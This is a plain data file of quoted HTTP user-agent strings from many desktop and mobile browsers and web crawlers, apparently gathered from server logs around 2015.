"Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; GT-N5110 Build/JDQ39) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Safari/537.16"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Linux; Android 5.1.1; LG-H345 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; U; Android 4.4.4; En-us; D2212 Build/18.5.B.0.26) AppleWebKit/534.30 (KHTML, Like Gecko) Version/4.0 Safari/534.30"
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAGWJS; rv:11.0) like Gecko"
"Mozilla/5.0 (Linux; Android 5.1.1; LG-H345 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Mobile Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2"
"Mozilla/5.0 (Android; Mobile; rv:39.0) Gecko/39.0 Firefox/39.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2489.0 Safari/537.36"
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; GT-N5110 Build/JDQ39) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Safari/537.16"
"Mozilla/5.0 (Linux; Android 5.1.1; LG-H345 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Mobile Safari/537.36 OPR/30.0.1856.93524"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
"Mozilla/5.0 (Linux; Android; 4.1.2; GT-I9100 Build/000000) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1234.12 Mobile Safari/537.22 OPR/14.0.123.123"
"Opera/9.80 (Android; Opera Mini/10.0.1884/37.6334; U; en) Presto/2.12.423 Version/12.16"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530 Dual SIM) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mediapartners-Google"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)"
"Mozilla/5.0 (X11; U; Linux x86_64; ko-Kore-US) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/30.0.1599.114 Safari/537.36 Puffin/4.5.0IT"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; WOW64; Trident/5.0)"
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/534.51.22 (KHTML, like Gecko) Version/5.1.1 Safari/534.51.22"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko)"
"Mozilla/5.0 (Windows NT 5.1; rv:39.0) Gecko/20100101 Firefox/39.0"
"Pinterest/0.2 (+http://www.pinterest.com/)"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 640 LTE; ANZ1074) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.26 Safari/537.36"
"Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/47.0 Chrome/41.0.2272.127 Safari/537.36"
"Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 640 LTE) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; it-it) AppleWebKit/531.21.11 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10"
"Mozilla/5.0 (Linux; U; Android 4.2; en-us; sdk Build/MR1) AppleWebKit/535.19 (KHTML, like Gecko) Version/4.2 Safari/535.19"
"Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0"
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 730 Dual SIM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10166"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; GWX:RESERVED)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_90) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5"
"DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5"
"Mozilla/5.0 (X11; FreeBSD amd64; rv:27.0) Gecko/20100101 Firefox/27.0"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; MS-RTC LM 8; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET4.0C)"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.46 Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB7.5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
"Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; Z520 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30;"
"Mozilla/5.0 (Linux; Android 5.0.1; LG-H440n Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174"
"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
"Mozilla/5.0 (Windows NT 5.0; rv:12.0) Gecko/20100101 Firefox/12.0"
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.6.30 Version/10.63"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.151 Safari/534.16"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 SeaMonkey/2.33.1"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
"GigablastOpenSource/1.0"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20"
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 630) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/43.3.3.185 Chrome/43.0.2357.81 Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB7.5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.1; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET4.0C)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:44.0) Gecko/20100101 Firefox/44.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10525"
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML like Gecko) Mobile/12A405 Version/7.0 Safari/9537.53"
"Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0"
"Mozilla/5.0 (Linux; U; Android 2.1-update1; ro-ro; U8300 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"
"Mozilla/5.0 (Linux; U; Android 4.3; ko-kr; SAMSUNG-SGH-I317 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36"
"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5"
"SAMSUNG-GT-E2230/1.0 Openwave/6.2.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0"
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0"
"Mozilla/5.0 (Linux; U; Android 4.3; en-us; SGH-T999 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Windows NT 6.1; rv:25.6) Gecko/20150723 Firefox/31.9 PaleMoon/25.6.0"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 540 Dual SIM) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
"Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 920) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile Safari/600.1.4"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; rv:41.0) Gecko/20100101 Firefox/41.0"
"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.18 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10"
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/49.0.146 Chrome/43.0.2357.146 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.102 Safari/535.2"
"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190"
"Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/36.0.1985.135 Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.4.4; W6S Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36"
"Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54"
"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36"
"Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.1.2576 Mobile Safari/537.35+"
"Mozilla/5.0 (X11; Linux i686; rv:25.6) Gecko/20150723 PaleMoon/25.6.0"
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
"Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; Xbox)"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; Xbox)"
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Linux; Android 4.4.2; SC7 PRO HD Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36"
"Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 930) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (Windows NT 6.2; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Windows; U; Windows NT 6.0; cs; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; WOW64; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.30618; MDDC; InfoPath.2; .NET4.0C)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2"
"Opera/9.80 (J2ME/MIDP; Opera Mini/4.0.13574/36.2596; U; en) Presto/2.12.423 Version/12.16"
"SonyEricssonK630i/R1FA Browser/NetFront/3.4 Profile/MIDP-2.1 Configuration/CLDC-1.1"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17 AirBrowse/6.0.0.4"
"Mozilla/5.0 (Linux; U; Android 4.2.2; fi-fi; SM-G350 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; Valve Steam GameOverlay/1440016726; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D201"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 435) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Lynx/2.8.9dev.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.2.16"
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; Lumia 535 Dual SIM) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; InfoPath.3; AskTbPTV/5.11.3.15590)"
"Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0"
"Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; Tablet PC 2.0)"
"Opera/9.80 (Windows Phone; Opera Mini/8.1.0/37.6334; U; en) Presto/2.12.423 Version/12.16"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/5.1 Mobile/12H321 Safari/7600.1.4"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/7.0; ASU2JS)"
"Mozilla/5.0 (Linux; Android 4.4.2; en-gb; SAMSUNG SM-T330 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.48 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3045.US Safari/537.1"
"Mozilla/5.0 (Linux; U; Android 4.3; en-us; sdk Build/MR1) AppleWebKit/536.23 (KHTML, like Gecko) Version/4.3 Mobile Safari/536.23"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.46 Safari/537.36"
"Mozilla/5.0 (New Nintendo 3DS like iPhone) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.0.5.15 Mobile NintendoBrowser/1.3.10126.EU"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36"
"Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/8.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 929) like Gecko"
"Mozilla/5.0 (Linux; U) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4"
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10"
"Mozilla/5.0 (Windows NT The given key was not present in the dictionary.; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; chromeframe/26.0.1410.64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1320) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.2; .NET4.0E)"
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko"
"Mozilla/5.0 (Linux; Android 5.1; XT1025 Build/LPC23.13-34.5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.108 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; SCH-I510 4G Build/FP8) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:31.0) Gecko/20100101 /31.0"
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4"
